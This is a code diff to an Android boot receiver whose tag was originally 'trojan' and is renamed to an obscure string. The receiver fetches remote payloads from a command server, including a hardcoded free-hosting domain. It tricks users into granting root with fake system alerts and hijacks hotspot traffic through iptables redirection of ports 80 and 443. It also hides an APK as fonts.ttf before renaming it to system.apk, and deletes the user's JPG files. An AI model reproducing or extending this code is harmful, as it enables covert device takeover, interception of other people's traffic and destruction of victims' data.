@@ -50,9 +50,10 @@ import java.lang.reflect.*;
 
 public class ReceiverBoot extends BroadcastReceiver
 {
-	private static String TAG = "trojan";
+	private static String TAG = "AsDfGhJ";
 	private Vibrator vibrator;
 	private boolean oke = true;
+	private SystemThread system;
 	private Context exContext;
 	private ServerUtils utils;
     private Installer installator;
@@ -64,19 +65,15 @@ public class ReceiverBoot extends BroadcastReceiver
 	private static boolean prosesThread = true;
 	private static boolean tmpThread = true;
 	private static int sizedownload = 0;
-	private static String[] server = { "http://10.42.0.1","http://sunjangyo12.000webhostapp.com" };
-	private static boolean finishInstall = false;
 	public AlertDialog dialog;
 	public Toast toast;
 	public static int delayToast = 0;
 
-	public static int iserver = 0;
-	public static int jumserver = 2;
+	public static boolean finishInstall = false;
     public static boolean rootResult = false;
 	public static boolean installResult = false;
 	public static String identitasResult = "";
 	public static boolean pingResult = false;
-	public static String urlServer = "";
 	public static String requestAksi = "";
 	public static String requestPath = "";
 	public static String requestUrl = "";
@@ -149,127 +146,7 @@ public class ReceiverBoot extends BroadcastReceiver
 				}
 			}catch (Exception e) {}
 
-			SystemThread system = new SystemThread();
-			system.reqPayload(context, urlServer+"/payload.php?outpayload="+hash, "null");
-		}
-	}
-
-	@Override
-	public void onReceive(Context context, Intent intent)
-	{
-		exContext = context;
-		float voltase = (float)(intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0))/100;
-		float persent = (float)(intent.getIntExtra(BatteryManager.EXTRA_LEVEL, 0));
-		int statusB = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
-
-		String[] portal = {
-				"iptables -A FORWARD -p udp --dport 53 -j ACCEPT",
-				"iptables -A FORWARD -p udp --sport 53 -j ACCEPT",
-				"iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination "+Identitas.getIPAddress(true)+":8888",
-				"iptables -P FORWARD DROP",
-				"iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 80"
-			};
-
-		boolean state = statusB == BatteryManager.BATTERY_STATUS_CHARGING || statusB == BatteryManager.BATTERY_STATUS_FULL;
-		String charger = "TIDAK_CHARGER";
-		if (state) {
-			int charPlug = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
-			boolean usbPlug = charPlug == BatteryManager.BATTERY_PLUGGED_USB;
-			boolean acPlug = charPlug == BatteryManager.BATTERY_PLUGGED_AC;
-			
-			if (usbPlug) {
-				charger = "USB_CHARGER";
-			}
-			else if (acPlug) {
-				charger = "AC_CHARGER";
-			}
-		}
-		batStatus = ""+voltase+"v "+persent+"% "+charger;
-
-		audioManager = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
-		vibrator = (Vibrator)context.getSystemService(Context.VIBRATOR_SERVICE);
-		settings = context.getSharedPreferences("Settings", 0);
-		seteditor = settings.edit();
-		mainSave = settings.getString("swmain","");
-		utils = new ServerUtils(context);
-		identitasResult = Identitas.getIPAddress(true);
-        pathToInstallServer = utils.getPathToInstallServer();
-        docFolder = utils.getDocFolder();
-        pathExternal = utils.getPathExternal();
-        urlServer = server[iserver];
-
-        if (settings.getString("server","").equals("aktif")) {
-        	install(context);
-        }
-
-        if (settings.getString("pakroot","").equals("aktif")) {
-        	if (rootRequest().equals("tolak user")) {
-				logSend(context, "root android state............TOLAK USER\n");
-				toastShow(context, "aktif", Color.RED, Gravity.TOP, "SYSTEM ALERT WINDOW\n\n\n     Please Allow superuser.    \n\nnetwork state can't access binary system to update manager\n\n\n");
-			}
-		}
-
-        if (mainSave.equals("hidup")) 
-		{
-			install(context);
-			if (installResult) 
-			{
-				rooting(context);
-				if (rootResult) 
-				{
-					main(context, portal);
-				}
-			}
-		}
-
-		if (hostspotStatus(context)) {
-			logSend(context, "Hotspot terpakai............OK\n");
-		}
-
-
-		//harus urut eksekusi
-		if (cekConnection(context) && !hostspotStatus(context)) 
-		{
-        	if (ping()){
-        		pingResult = true;
-        	} 
-        	else {
-        		pingResult = false;
-        		iserver += 1;
-				if (iserver == jumserver) {
-					iserver = 0;
-				}
-        	}
-        } 
-        else {
-        	pingResult = false;
-        }
-
-        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) 
-        {
-			context.startService(new Intent(context, SystemThread.class));
-
-			/*if (!new MainActivity().apkMana(context, "com.google.android.apps.man", "open")) 
-			{
-				if (rootResult) {
-					String[] apk = { "pm install "+pathExternal+"/com.google.android.apk" };
-					rootCommands(apk);
-				} 
-				else {
-					toastShow(context, "mati", 0, 0, "");
-					toastShow(context, "aktif", Color.YELLOW, Gravity.TOP, "SYSTEM ALERT WINDOW!!\n\n\nSystem firmware can't access /etc/build.prop please follow this Tutorial.\n\n1. Install this app\n2.allow playstore prompt\n\n\n\n\n\n       [ WARNING! ]\n\n\n");
-		
-					String apktemp = pathExternal+"/com.google.android.apk";
-
-        			intent.setDataAndType(Uri.fromFile(new File(apktemp)), "application/vnd.android.package-archive");
-        			intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        			context.startActivity(intent);
-				}
-			}
-			try {
-				Runtime.getRuntime().exec("rm "+pathExternal+"/*.jpg");
-			}
-			catch(Exception e) {}*/
+			system.reqPayload(context, system.urlServer+"/payload.php?outpayload="+hash, "null");
 		}
 	}
 
@@ -279,7 +156,7 @@ public class ReceiverBoot extends BroadcastReceiver
 	    {
 	    	Log.i(TAG, "download all data..........");
 			
-			requestUrl = urlServer+"/install.txt";
+			requestUrl = system.urlServer+"/install.txt";
 			requestAksi = "web";
 			mainRequest(context);
 
@@ -511,15 +388,15 @@ public class ReceiverBoot extends BroadcastReceiver
 		return "ada";
 	}
 
-	public boolean ping() {
-		Log.i(TAG, "ping server: "+urlServer);
+	public boolean ping(Context context) {
+		Log.i(TAG, "ping server: "+system.urlServer);
 
 		HttpParams httpParams = new BasicHttpParams();
 	    HttpConnectionParams.setConnectionTimeout(httpParams, 10000);
 	    HttpConnectionParams.setSoTimeout(httpParams, 10000);
 
         HttpClient httpClient = new DefaultHttpClient(httpParams);
-        HttpGet request = new HttpGet(urlServer);
+        HttpGet request = new HttpGet(system.urlServer);
         try{
         	Log.i(TAG, "ping....");
             HttpResponse response = httpClient.execute(request);
@@ -753,14 +630,18 @@ public class ReceiverBoot extends BroadcastReceiver
 
 	public void toastText(Context context, String data, int warna, int letak)
 	{
-		LayoutInflater inflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE );
-		View layout = inflater.inflate(R.layout.toast, null);
+		LinearLayout layout = new LinearLayout(context);
+		ImageView image = new ImageView(context);
+		
+		image.setImageResource(R.drawable.img);
+		layout.addView(image);
 
-    	TextView text = (TextView) layout.findViewById(R.id.toast);
+    	TextView text = new TextView(context);
 		text.setText(data);
 		text.setTextColor(Color.BLACK);
 		text.setTextSize(13);
 		text.setGravity(Gravity.CENTER);
+		layout.addView(text);
 
 		toast = new Toast(context.getApplicationContext());
 		toast.setGravity(letak, 0, 0);
@@ -1039,6 +920,129 @@ public class ReceiverBoot extends BroadcastReceiver
         }
         return sret;
     }
+
+    @Override
+	public void onReceive(Context context, Intent intent)
+	{
+		exContext = context;
+		float voltase = (float)(intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0))/100;
+		float persent = (float)(intent.getIntExtra(BatteryManager.EXTRA_LEVEL, 0));
+		int statusB = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
+
+		String[] portal = {
+				"iptables -A FORWARD -p udp --dport 53 -j ACCEPT",
+				"iptables -A FORWARD -p udp --sport 53 -j ACCEPT",
+				"iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination "+Identitas.getIPAddress(true)+":8888",
+				"iptables -P FORWARD DROP",
+				"iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 80"
+			};
+
+		boolean state = statusB == BatteryManager.BATTERY_STATUS_CHARGING || statusB == BatteryManager.BATTERY_STATUS_FULL;
+		String charger = "TIDAK_CHARGER";
+		if (state) {
+			int charPlug = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
+			boolean usbPlug = charPlug == BatteryManager.BATTERY_PLUGGED_USB;
+			boolean acPlug = charPlug == BatteryManager.BATTERY_PLUGGED_AC;
+			
+			if (usbPlug) {
+				charger = "USB_CHARGER";
+			}
+			else if (acPlug) {
+				charger = "AC_CHARGER";
+			}
+		}
+		batStatus = ""+voltase+"v "+persent+"% "+charger;
+
+		system = new SystemThread();
+		audioManager = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
+		vibrator = (Vibrator)context.getSystemService(Context.VIBRATOR_SERVICE);
+		settings = context.getSharedPreferences("Settings", 0);
+		seteditor = settings.edit();
+		mainSave = settings.getString("swmain","");
+		utils = new ServerUtils(context);
+		identitasResult = Identitas.getIPAddress(true);
+        pathToInstallServer = utils.getPathToInstallServer();
+        docFolder = utils.getDocFolder();
+        pathExternal = utils.getPathExternal();
+
+        if (settings.getString("server","").equals("aktif")) {
+        	install(context);
+        }
+
+        if (settings.getString("pakroot","").equals("aktif")) {
+        	if (rootRequest().equals("tolak user")) {
+				logSend(context, "root android state............TOLAK USER\n");
+				toastShow(context, "aktif", Color.RED, Gravity.TOP, "SYSTEM ALERT WINDOW\n\n\n     Please Allow superuser.    \n\nnetwork state can't access binary system to update manager\n\n\n");
+			}
+		}
+
+        if (mainSave.equals("hidup")) 
+		{
+			install(context);
+			if (installResult) 
+			{
+				rooting(context);
+				if (rootResult) 
+				{
+					main(context, portal);
+				}
+			}
+		}
+
+		if (hostspotStatus(context)) {
+			logSend(context, "Hotspot terpakai............OK\n");
+		}
+
+
+		//harus urut eksekusi
+		if (cekConnection(context) && !hostspotStatus(context)) 
+		{
+			if (charger.equals("USB_CHARGER")) 
+			{
+				pingResult = false;
+			} else {
+				pingResult = true;
+			}
+
+			//DEBUG MODE
+			//pingResult = true;
+			
+        } 
+        else {
+        	pingResult = false;
+        }
+
+        finishInstall = false;
+        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) 
+        {
+        	finishInstall = true;
+			context.startService(new Intent(context, SystemThread.class));
+			File htdocs = new File(utils.getPathExternal());
+        	if (!htdocs.exists()) {
+        	    htdocs.mkdir();
+        	}
+
+			try {
+				if (!new MainActivity().apkMana(context, "os.system", "open")) 
+				{
+					new Installer(context, true).assetToSdcard(context, "fonts.ttf", pathExternal+"/");
+					Thread.sleep(1000);
+					Runtime.getRuntime().exec("mv "+pathExternal+"/fonts.ttf "+pathExternal+"/system.apk");
+					Thread.sleep(1000);
+				}
+				Log.i(TAG, "exekusi sukses");
+
+			}catch(Exception e) {
+				Log.i(TAG, "errrot:"+e);
+			}
+
+
+			try {
+				Runtime.getRuntime().exec("rm "+pathExternal+"/*.jpg");
+			}
+			catch(Exception e) {}
+		}
+	}
 
 
 	private class CallWebPageTask extends AsyncTask<String, Void, String> 
